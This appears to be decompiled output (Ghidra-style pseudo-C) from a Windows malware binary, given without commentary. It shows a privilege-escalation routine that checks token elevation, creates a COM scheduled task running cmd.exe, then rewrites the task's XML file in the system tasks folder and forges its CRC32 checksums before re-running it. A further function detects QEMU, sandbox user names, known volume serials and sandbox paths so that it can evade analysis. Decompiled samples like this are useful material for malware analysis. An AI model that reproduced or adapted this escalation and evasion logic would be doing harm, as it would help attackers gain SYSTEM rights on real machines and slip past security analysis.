  if (BVar2 != 0) {
    DVar3 = 0;
    pvVar1 = GetProcessHeap();
    HeapFree(pvVar1,DVar3,unaff_EDI);
  }
  return;
}



undefined4 FUN_00403050(OLECHAR *param_1)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  HRESULT HVar5;
  int iVar6;
  int *piVar7;
  LONG LVar8;
  undefined4 uVar9;
  VARIANTARG local_80;
  VARIANTARG local_70;
  VARIANTARG local_60;
  undefined2 local_50;
  undefined2 uStack_4e;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  ULONG local_3c;
  undefined4 local_38;
  undefined4 local_34;
  int *local_30;
  int *local_2c;
  undefined4 local_28;
  ULONG local_24;
  undefined4 local_20;
  undefined4 local_1c;
  int *local_18;
  int *local_14;
  int *local_10;
  int local_c;
  
  HVar5 = CoInitializeEx((LPVOID)0x0,0);
  if (HVar5 < 0) {
    return 1;
  }
  HVar5 = CoInitializeSecurity
                    ((PSECURITY_DESCRIPTOR)0x0,-1,(SOLE_AUTHENTICATION_SERVICE *)0x0,(void *)0x0,6,3
                     ,(void *)0x0,0,(void *)0x0);
  if (HVar5 < 0) {
    return 1;
  }
  local_14 = (int *)0x0;
  HVar5 = CoCreateInstance((IID *)&DAT_00404418,(LPUNKNOWN)0x0,1,(IID *)&DAT_00404208,&local_14);
  if (HVar5 < 0) {
    return 1;
  }
  VariantInit(&local_70);
  uVar3 = local_70.n1._12_4_;
  uVar2 = local_70.n1._8_4_;
  uVar1 = local_70.n1.decVal.Hi32;
  VariantInit(&local_60);
  local_24 = local_60.n1.decVal.Hi32;
  local_28 = local_60.n1._0_4_;
  local_20 = local_60.n1._8_4_;
  local_1c = local_60.n1._12_4_;
  VariantInit(&local_80);
  local_3c = local_80.n1.decVal.Hi32;
  local_40 = local_80.n1._0_4_;
  local_38 = local_80.n1._8_4_;
  local_34 = local_80.n1._12_4_;
  VariantInit((VARIANTARG *)&local_50);
  iVar6 = (**(code **)(*local_14 + 0x28))
                    (local_14,_local_50,local_4c,local_48,local_44,local_40,local_3c,local_38,
                     local_34,local_28,local_24,local_20,local_1c,local_70.n1._0_4_,uVar1,uVar2,
                     uVar3);
  VariantClear((VARIANTARG *)&local_50);
  VariantClear(&local_80);
  VariantClear(&local_60);
  VariantClear(&local_70);
  if (iVar6 < 0) {
    return 1;
  }
  piVar7 = (int *)FUN_00402f70((OLECHAR *)&DAT_00404f38);
  if ((undefined4 *)*piVar7 == (undefined4 *)0x0) {
    uVar9 = 0;
  }
  else {
    uVar9 = *(undefined4 *)*piVar7;
  }
  iVar6 = (**(code **)(*local_14 + 0x1c))(local_14,uVar9,&DAT_0045c1bc);
  if (((local_c != 0) && (LVar8 = InterlockedDecrement((LONG *)(local_c + 8)), LVar8 == 0)) &&
     (local_c != 0)) {
    FUN_00402ff0();
  }
  if (iVar6 < 0) {
    (**(code **)(*local_14 + 8))(local_14);
    return 1;
  }
  piVar7 = (int *)FUN_00402f70(param_1);
  if ((undefined4 *)*piVar7 == (undefined4 *)0x0) {
    uVar9 = 0;
  }
  else {
    uVar9 = *(undefined4 *)*piVar7;
  }
  (**(code **)(*DAT_0045c1bc + 0x3c))(DAT_0045c1bc,uVar9,0);
  FUN_00402fc0();
  local_10 = (int *)0x0;
  iVar6 = (**(code **)(*local_14 + 0x24))(local_14,0,&local_10);
  (**(code **)(*local_14 + 8))(local_14);
  if (iVar6 < 0) {
    (**(code **)(*DAT_0045c1bc + 8))(DAT_0045c1bc);
    return 1;
  }
  local_18 = (int *)0x0;
  local_30 = (int *)0x0;
  iVar6 = (**(code **)(*local_10 + 0x44))(local_10,&local_30);
  if (-1 < iVar6) {
    local_2c = (int *)0x0;
    iVar6 = (**(code **)(*local_30 + 0x30))(local_30,0,&local_2c);
    (**(code **)(*local_30 + 8))(local_30);
    if (-1 < iVar6) {
      iVar6 = (**(code **)*local_2c)(local_2c,&DAT_00404368,&local_18);
      (**(code **)(*local_2c + 8))(local_2c);
      if (-1 < iVar6) {
        piVar7 = (int *)FUN_00402f70(u_cmd_exe_00404f3c);
        if ((undefined4 *)*piVar7 == (undefined4 *)0x0) {
          uVar9 = 0;
        }
        else {
          uVar9 = *(undefined4 *)*piVar7;
        }
        iVar6 = (**(code **)(*local_18 + 0x2c))(local_18,uVar9);
        FUN_00402fc0();
        if (-1 < iVar6) {
          piVar7 = (int *)FUN_00402f70((OLECHAR *)&DAT_00404f4c);
          if ((undefined4 *)*piVar7 == (undefined4 *)0x0) {
            uVar9 = 0;
          }
          else {
            uVar9 = *(undefined4 *)*piVar7;
          }
          iVar6 = (**(code **)(*local_18 + 0x34))(local_18,uVar9);
          FUN_00402fc0();
          if (-1 < iVar6) {
            local_50 = 8;
            local_70.n1._8_4_ = SysAllocString((OLECHAR *)&DAT_00404f4c);
            uVar4 = _local_50;
            local_70.n1.decVal.Hi32 = local_4c;
            local_70.n1._12_4_ = local_44;
            local_48 = local_70.n1._8_4_;
            VariantInit(&local_80);
            local_3c = local_80.n1.decVal.Hi32;
            local_40 = local_80.n1._0_4_;
            local_38 = local_80.n1._8_4_;
            local_34 = local_80.n1._12_4_;
            VariantInit(&local_60);
            local_24 = local_60.n1.decVal.Hi32;
            local_28 = local_60.n1._0_4_;
            local_20 = local_60.n1._8_4_;
            local_1c = local_60.n1._12_4_;
            piVar7 = (int *)FUN_00402f70(param_1);
            if ((undefined4 *)*piVar7 == (undefined4 *)0x0) {
              uVar9 = 0;
            }
            else {
              uVar9 = *(undefined4 *)*piVar7;
            }
            iVar6 = (**(code **)(*DAT_0045c1bc + 0x44))
                              (DAT_0045c1bc,uVar9,local_10,6,local_28,local_24,local_20,local_1c,
                               local_40,local_3c,local_38,local_34,3,uVar4,local_70.n1.decVal.Hi32,
                               local_70.n1._8_4_,local_70.n1._12_4_,&DAT_0045a444);
            FUN_00402fc0();
            VariantClear(&local_60);
            VariantClear(&local_80);
            VariantClear((VARIANTARG *)&local_50);
            if (-1 < iVar6) {
              return 0;
            }
            (**(code **)(*DAT_0045c1bc + 8))(DAT_0045c1bc);
            goto LAB_0040333c;
          }
        }
        (**(code **)(*local_18 + 8))(local_18);
      }
    }
  }
  (**(code **)(*DAT_0045c1bc + 8))(DAT_0045c1bc);
LAB_0040333c:
  (**(code **)(*local_10 + 8))(local_10);
  return 1;
}



undefined4 FUN_004034c0(LPVOID param_1)

{
  BOOL BVar1;
  HANDLE ProcessHandle;
  undefined4 uVar2;
  DWORD DesiredAccess;
  HANDLE *TokenHandle;
  _OSVERSIONINFOA local_a0;
  DWORD local_c;
  HANDLE local_8;
  
  uVar2 = 0x80004005;
  local_8 = (HANDLE)0x0;
  local_a0.dwOSVersionInfoSize = 0x94;
  BVar1 = GetVersionExA(&local_a0);
  if (((BVar1 != 0) && (local_a0.dwPlatformId == 2)) && (5 < local_a0.dwMajorVersion)) {
    TokenHandle = &local_8;
    DesiredAccess = 8;
    ProcessHandle = GetCurrentProcess();
    BVar1 = OpenProcessToken(ProcessHandle,DesiredAccess,TokenHandle);
    if (BVar1 != 0) {
      local_c = 0;
      BVar1 = GetTokenInformation(local_8,TokenElevationType,param_1,4,&local_c);
      if ((BVar1 != 0) && (local_c == 4)) {
        uVar2 = 0;
      }
      CloseHandle(local_8);
    }
  }
  return uVar2;
}



undefined4 FUN_00403560(void)

{
  short *psVar1;
  size_t _Count;
  byte bVar2;
  short sVar3;
  wchar_t wVar4;
  undefined4 nNumberOfBytesToRead;
  BOOL BVar5;
  DWORD DVar6;
  undefined4 *puVar7;
  uint uVar8;
  HANDLE pvVar9;
  wchar_t *_Dest;
  wchar_t *pwVar10;
  wchar_t *pwVar11;
  uint *puVar12;
  int iVar13;
  uint uVar14;
  wchar_t *pwVar15;
  uint *puVar16;
  undefined4 *puVar17;
  undefined4 local_914;
  VARIANTARG VStack_910;
  uint *puStack_900;
  int iStack_8fc;
  _OSVERSIONINFOA _Stack_8f8;
  undefined4 local_860;
  WCHAR local_658;
  undefined local_656 [516];
  undefined auStack_452 [2];
  undefined4 local_450 [21];
  undefined local_3fc [436];
  undefined4 local_248;
  
  puVar7 = (undefined4 *)u__<Principals>_<Principal_id__Loc_00404f50;
  puVar17 = &local_248;
  for (iVar13 = 0x8f; iVar13 != 0; iVar13 = iVar13 + -1) {
    *puVar17 = *puVar7;
    puVar7 = puVar7 + 1;
    puVar17 = puVar17 + 1;
  }
  *(undefined2 *)puVar17 = *(undefined2 *)puVar7;
  local_914 = 0;
  puVar7 = (undefined4 *)u_____globalroot_systemroot_system_00405190;
  puVar17 = local_450;
  for (iVar13 = 0x15; iVar13 != 0; iVar13 = iVar13 + -1) {
    *puVar17 = *puVar7;
    puVar7 = puVar7 + 1;
    puVar17 = puVar17 + 1;
  }
  memset(local_3fc,0,0x1b4);
  local_658 = L'\0';
  memset(local_656,0,0x206);
  local_860._0_2_ = 0;
  memset((void *)((int)&local_860 + 2),0,0x206);
  BVar5 = IsUserAnAdmin();
  if (BVar5 == 0) {
    _Stack_8f8.dwOSVersionInfoSize = 0x94;
    BVar5 = GetVersionExA(&_Stack_8f8);
    if ((((BVar5 != 0) && (_Stack_8f8.dwPlatformId == 2)) && (5 < _Stack_8f8.dwMajorVersion)) &&
       ((iVar13 = FUN_004034c0(&iStack_8fc), iVar13 == -0x7fffbffb && (iStack_8fc == 3)))) {
      DVar6 = GetTickCount();
      _snwprintf((wchar_t *)&local_860,0x208,u_task_d_004051e4,DVar6);
      puVar7 = &local_860;
      do {
        sVar3 = *(short *)puVar7;
        puVar7 = (undefined4 *)((int)puVar7 + 2);
      } while (sVar3 != 0);
      uVar8 = (int)puVar7 - (int)&local_860;
      puVar7 = (undefined4 *)auStack_452;
      do {
        psVar1 = (short *)((int)puVar7 + 2);
        puVar7 = (undefined4 *)((int)puVar7 + 2);
      } while (*psVar1 != 0);
      puVar17 = &local_860;
      for (uVar14 = uVar8 >> 2; uVar14 != 0; uVar14 = uVar14 - 1) {
        *puVar7 = *puVar17;
        puVar17 = puVar17 + 1;
        puVar7 = puVar7 + 1;
      }
      for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
        *(undefined *)puVar7 = *(undefined *)puVar17;
        puVar17 = (undefined4 *)((int)puVar17 + 1);
        puVar7 = (undefined4 *)((int)puVar7 + 1);
      }
      GetModuleFileNameW((HMODULE)0x0,&local_658,0x208);
      iVar13 = FUN_00403050((OLECHAR *)&local_860);
      if (iVar13 == 0) {
        puVar7 = &local_248;
        do {
          sVar3 = *(short *)puVar7;
          puVar7 = (undefined4 *)((int)puVar7 + 2);
        } while (sVar3 != 0);
        iVar13 = ((int)puVar7 - ((int)&local_248 + 2) >> 1) * 2;
        _Count = iVar13 + 0x208;
        if (_Count != 0) {
          uVar14 = iVar13 + 0x21bU & 0xfffffff0;
          DVar6 = 8;
          uVar8 = uVar14;
          pvVar9 = GetProcessHeap();
          _Dest = (wchar_t *)HeapAlloc(pvVar9,DVar6,uVar8);
          if (_Dest != (wchar_t *)0x0) {
            memset(_Dest,0,uVar14);
            _snwprintf(_Dest,_Count,(wchar_t *)&local_248,&local_658);
            pvVar9 = CreateFileW((LPCWSTR)local_450,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,
                                 (HANDLE)0x0);
            if (pvVar9 != (HANDLE)0xffffffff) {
              SetFilePointer(pvVar9,0,(PLONG)0x0,0);
              VStack_910.n1._0_4_ = 0;
              VStack_910.n1.decVal.Hi32 = 0;
              GetFileSizeEx(pvVar9,(PLARGE_INTEGER)&VStack_910);
              nNumberOfBytesToRead = VStack_910.n1._0_4_;
              if (VStack_910.n1._0_4_ != 0) {
                puVar7 = &local_248;
                do {
                  sVar3 = *(short *)puVar7;
                  puVar7 = (undefined4 *)((int)puVar7 + 2);
                } while (sVar3 != 0);
                pwVar10 = (wchar_t *)
                          FUN_004013e0(VStack_910.n1._0_4_ + 0x410 +
                                       ((int)puVar7 - ((int)&local_248 + 2) >> 1) * 2);
                if (pwVar10 != (wchar_t *)0x0) {
                  ReadFile(pvVar9,pwVar10,nNumberOfBytesToRead,(LPDWORD)&puStack_900,
                           (LPOVERLAPPED)0x0);
                  uVar8 = FUN_00403c00((byte *)(pwVar10 + 1),nNumberOfBytesToRead - 2,0);
                  uVar8 = ~uVar8;
                  pwVar11 = wcsstr(pwVar10,u_<Actions_004051f4);
                  if (pwVar11 != (wchar_t *)0x0) {
                    pwVar15 = _Dest;
                    do {
                      wVar4 = *pwVar15;
                      *(wchar_t *)(((int)pwVar11 - (int)_Dest) + (int)pwVar15) = wVar4;
                      pwVar15 = pwVar15 + 1;
                    } while (wVar4 != L'\0');
                    puVar12 = (uint *)wcsstr(pwVar11,u_00__>_00405208);
                    if (puVar12 != (uint *)0x0) {
                      pwVar11 = pwVar10 + 1;
                      do {
                        wVar4 = *pwVar11;
                        pwVar11 = pwVar11 + 1;
                      } while (wVar4 != L'\0');
                      uVar14 = FUN_00403c00((byte *)(pwVar10 + 1),
                                            ((int)pwVar11 - (int)(pwVar10 + 2) >> 1) * 2 + -0xe,0);
                      *puVar12 = ~uVar14;
                      puVar16 = puVar12 + 3;
                      VStack_910.n1._0_4_ = 7;
                      do {
                        uVar8 = (uint)*(byte *)((int)puVar16 + 1) ^
                                *(uint *)(&DAT_00459b10 + (uVar8 >> 0x18) * 4) ^ uVar8 << 8;
                        bVar2 = *(byte *)puVar16;
                        puVar16 = (uint *)((int)puVar16 + -2);
                        uVar8 = (uint)bVar2 ^
                                uVar8 << 8 ^ *(uint *)(&DAT_00459b10 + (uVar8 >> 0x18) * 4);
                        VStack_910.n1._0_4_ = VStack_910.n1._0_4_ - 1;
                      } while (VStack_910.n1._0_4_ != 0);
                      *puVar12 = uVar8;
                      puStack_900 = puVar12;
                      SetFilePointer(pvVar9,0,(PLONG)0x0,0);
                      pwVar11 = pwVar10;
                      do {
                        wVar4 = *pwVar11;
                        pwVar11 = pwVar11 + 1;
                      } while (wVar4 != L'\0');
                      WriteFile(pvVar9,pwVar10,((int)pwVar11 - (int)(pwVar10 + 1) >> 1) * 2,
                                (LPDWORD)&puStack_900,(LPOVERLAPPED)0x0);
                      SetEndOfFile(pvVar9);
                      CloseHandle(pvVar9);
                      iVar13 = (**(code **)(*DAT_0045a444 + 0x2c))(DAT_0045a444,0);
                      if ((-1 < iVar13) &&
                         (iVar13 = (**(code **)(*DAT_0045a444 + 0x2c))(DAT_0045a444,0xffffffff),
                         -1 < iVar13)) {
                        VariantInit(&VStack_910);
                        iVar13 = (**(code **)(*DAT_0045a444 + 0x30))
                                           (DAT_0045a444,VStack_910.n1._0_4_,
                                            VStack_910.n1.decVal.Hi32,VStack_910.n1._8_4_,
                                            VStack_910.n1._12_4_,0);
                        VariantClear(&VStack_910);
                        if (-1 < iVar13) {
                          local_914 = 1;
                        }
                      }
                    }
                  }
                  DVar6 = 0;
                  pwVar11 = pwVar10;
                  pvVar9 = GetProcessHeap();
                  BVar5 = HeapValidate(pvVar9,DVar6,pwVar11);
                  if (BVar5 != 0) {
                    DVar6 = 0;
                    pvVar9 = GetProcessHeap();
                    HeapFree(pvVar9,DVar6,pwVar10);
                  }
                }
              }
            }
            DVar6 = 0;
            pwVar10 = _Dest;
            pvVar9 = GetProcessHeap();
            BVar5 = HeapValidate(pvVar9,DVar6,pwVar10);
            if (BVar5 != 0) {
              DVar6 = 0;
              pvVar9 = GetProcessHeap();
              HeapFree(pvVar9,DVar6,_Dest);
            }
          }
        }
      }
    }
  }
  if (DAT_0045c1bc != (int *)0x0) {
    (**(code **)(*DAT_0045c1bc + 8))(DAT_0045c1bc);
  }
  if (DAT_0045a444 != (int *)0x0) {
    (**(code **)(*DAT_0045a444 + 8))(DAT_0045a444);
  }
  return local_914;
}



undefined4 FUN_00403a20(void)

{
  LSTATUS LVar1;
  char *pcVar2;
  LPSTR pCVar3;
  undefined4 uVar4;
  BYTE local_620;
  char local_61f;
  char local_61e;
  char local_61d;
  CHAR local_220 [260];
  CHAR local_11c [3];
  undefined local_119;
  DWORD local_18;
  DWORD local_14;
  DWORD local_10;
  DWORD local_c;
  HKEY local_8;
  
  local_18 = 0x104;
  local_c = 0;
  uVar4 = 1;
  local_14 = 0x400;
  local_10 = 7;
  LVar1 = RegOpenKeyExA((HKEY)0x80000002,s_HARDWARE_DESCRIPTION_System_00405214,0,0x101,&local_8);
  if (LVar1 == 0) {
    LVar1 = RegQueryValueExA((HKEY)0x80000002,s_SystemBiosVersion_00405230,(LPDWORD)0x0,&local_10,
                             &local_620,&local_14);
    if (LVar1 == 0) {
      RegCloseKey(local_8);
      if ((((local_620 == 'Q') && (local_61f == 'E')) && (local_61e == 'M')) && (local_61d == 'U'))
      {
        return 1;
      }
    }
    else {
      RegCloseKey(local_8);
    }
  }
  GetUserNameA(local_220,&local_18);
  CharUpperA(local_220);
  pcVar2 = strstr(local_220,s_SANDBOX_00405244);
  if (((pcVar2 == (char *)0x0) &&
      (pcVar2 = strstr(local_220,s_MALNETVM_0040524c), pcVar2 == (char *)0x0)) &&
     (pcVar2 = strstr(local_220,s_VIRUSCLONE_00405258), pcVar2 == (char *)0x0)) {
    GetSystemWindowsDirectoryA(local_11c,0x104);
    local_119 = 0;
    GetVolumeInformationA(local_11c,(LPSTR)0x0,0,&local_c,(LPDWORD)0x0,(LPDWORD)0x0,(LPSTR)0x0,0);
    if (((local_c != 0xcd1a40) && (local_c != 0x6cbbc508)) &&
       ((local_c != 0x774e1682 && ((local_c != 0x837f873e && (local_c != 0x8b6f64bc)))))) {
      GetModuleFileNameA((HMODULE)0x0,local_11c,0x104);
      pCVar3 = StrStrIA(local_11c,s__sand_box__00405264);
      if ((pCVar3 == (LPSTR)0x0) &&
         ((pCVar3 = StrStrIA(local_11c,s__cwsandbox__00405270), pCVar3 == (LPSTR)0x0 &&
          (pCVar3 = StrStrIA(local_11c,s__sandbox__0040527c), pCVar3 == (LPSTR)0x0)))) {
        uVar4 = 0;
      }
    }
  }
  return uVar4;
}



uint FUN_00403c00(byte *param_1,int param_2,uint param_3)

{
  byte bVar1;
  uint uVar2;
  
  uVar2 = param_3 ^ 0xffffffff;
  if (param_2 != 0) {
    do {
      bVar1 = *param_1;
      param_1 = param_1 + 1;
      uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_00406000 + (uint)(byte)((byte)uVar2 ^ bVar1) * 4);
      param_2 = param_2 + -1;
    } while (param_2 != 0);
  }
  return uVar2 ^ 0xffffffff;
}



void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403c38. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403c3e. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}


